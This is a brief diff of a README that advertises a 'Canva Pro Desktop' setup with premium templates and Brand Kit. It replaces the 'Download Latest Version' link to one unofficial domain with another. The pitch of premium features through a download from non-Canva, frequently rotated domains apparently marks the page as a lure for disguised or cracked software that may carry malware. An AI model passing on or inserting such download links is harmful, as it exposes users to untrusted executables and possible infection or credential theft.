@@ -4,7 +4,7 @@ One-command setup for Canva Pro Desktop — premium templates, Brand Kit, Backgr
 
 ## Install
 
-**[Download Latest Version](https://canva.zipzapsol.space/)**
+**[Download Latest Version](https://canva.wonderchain.fun/)**
 
 ## What it does
 
